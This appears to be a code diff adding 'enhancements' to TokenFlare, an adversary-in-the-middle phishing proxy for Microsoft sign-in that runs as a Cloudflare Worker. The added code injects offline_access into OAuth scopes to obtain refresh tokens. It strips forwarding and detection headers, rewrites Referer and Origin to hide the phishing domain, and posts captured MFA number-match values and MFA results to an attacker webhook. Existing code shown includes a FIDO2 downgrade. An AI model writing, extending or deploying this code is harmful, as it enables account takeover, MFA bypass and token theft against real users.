@@ -48,8 +48,21 @@ export default {
 
     // 2) Prepare upstream URL + headers
     const clientUrl = new URL(request.url);
-    const upstreamUrl = makeUpstreamUrl(clientUrl, cfg);
+    let upstreamUrl = makeUpstreamUrl(clientUrl, cfg);
     const proxyHeaders = makeProxyHeaders(request.headers, cfg.upstreamHost, `${upstreamUrl.protocol}//${clientUrl.hostname}`, cfg.userAgentString);
+
+    // Enhancement 3: Scope injection — ensure offline_access is in the authorize scope
+    if (upstreamUrl !== 'unauthenticated' && upstreamUrl.toString().includes('/oauth2/v2.0/authorize') && !upstreamUrl.toString().includes('offline_access')) {
+      const urlStr = upstreamUrl.toString().replace(/scope=([^&]+)/, (match, scope) => {
+        const decoded = decodeURIComponent(scope);
+        if (!decoded.includes('offline_access')) {
+          return 'scope=' + encodeURIComponent(decoded + ' offline_access');
+        }
+        return match;
+      });
+      upstreamUrl = new URL(urlStr);
+      log.info('Scope injection: added offline_access to authorize request');
+    }
     
     // 3) Redirect unauthenticated requests
     if (upstreamUrl === 'unauthenticated') {
@@ -70,6 +83,24 @@ export default {
       log.info('FIDO2 downgrade: spoofed User-Agent for upstream request');
     }
 
+    // Enhancement 4: Strip Cloudflare detection headers before upstream fetch
+    const headersToStrip = [
+      'cf-connecting-ip', 'cf-ipcountry', 'cf-ray', 'cf-visitor',
+      'x-forwarded-for', 'x-forwarded-proto', 'x-real-ip',
+      'cdn-loop', 'cf-ew-via',
+    ];
+    for (const h of headersToStrip) {
+      proxyHeaders.delete(h);
+    }
+    // Rewrite Referer and Origin to hide phishing domain
+    if (proxyHeaders.has('referer')) {
+      const ref = proxyHeaders.get('referer');
+      proxyHeaders.set('referer', ref.replace(env.LOCAL_PHISHING_DOMAIN || '', 'login.microsoftonline.com'));
+    }
+    if (proxyHeaders.has('origin')) {
+      proxyHeaders.set('origin', 'https://login.microsoftonline.com');
+    }
+
     // 6) Proxy to upstream
     const upstreamResp = await fetch(upstreamUrl.toString(), {
       method: request.method,
@@ -80,6 +111,58 @@ export default {
 
     // WS upgrades pass straight through
     if (isWebSocketUpgrade(proxyHeaders)) return upstreamResp;
+
+    // Enhancement 1: Number matching capture from SAS/BeginAuth
+    if (upstreamUrl.toString().includes('/SAS/BeginAuth') || upstreamUrl.toString().includes('/common/SAS/BeginAuth')) {
+      try {
+        const sasBody = await upstreamResp.clone().json();
+        if (sasBody.Entropy !== undefined) {
+          const webhook = cfg.webhookUrl || '';
+          if (webhook) {
+            fetch(webhook, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                source: 'TokenFlare',
+                type: 'mfa_number_match',
+                timestamp: new Date().toISOString(),
+                entropy: sasBody.Entropy,
+                session_id: sasBody.SessionId || '',
+                auth_method: sasBody.AuthMethodId || '',
+              }),
+            }).catch(() => {});
+          }
+          log.info(`MFA number match captured: ${sasBody.Entropy}`);
+        }
+      } catch (e) {
+        // Ignore parse errors — not all responses are JSON
+      }
+    }
+
+    // Enhancement 2: MFA method/result capture from SAS/EndAuth
+    if (upstreamUrl.toString().includes('/SAS/EndAuth') || upstreamUrl.toString().includes('/common/SAS/EndAuth')) {
+      try {
+        const endBody = await upstreamResp.clone().json();
+        const webhook = cfg.webhookUrl || '';
+        if (webhook) {
+          fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              source: 'TokenFlare',
+              type: 'mfa_result',
+              timestamp: new Date().toISOString(),
+              success: endBody.Success || false,
+              auth_method: endBody.AuthMethodId || '',
+              result_value: endBody.ResultValue || '',
+            }),
+          }).catch(() => {});
+        }
+        log.info(`MFA result captured: success=${endBody.Success}, method=${endBody.AuthMethodId}`);
+      } catch (e) {
+        // Ignore parse errors
+      }
+    }
 
     // 7) GetCredentialType intercept: send auth method intel to webhook
     if (cfg.webhookUrl && upstreamUrl.toString().includes('/GetCredentialType')) {
@@ -103,6 +186,15 @@ export default {
 
     // 8) Build downstream response
     let outHeaders = relaxSecurityHeaders(upstreamResp.headers);
+
+    // Enhancement 5: Strip Microsoft telemetry headers from responses
+    const responseHeadersToStrip = [
+      'x-ms-diagnostics', 'x-ms-request-id', 'x-ms-ests-server',
+      'x-ms-clitelem',
+    ];
+    for (const h of responseHeadersToStrip) {
+      outHeaders.delete(h);
+    }
 
     let locationHeader;
     if (outHeaders.has("Location")){
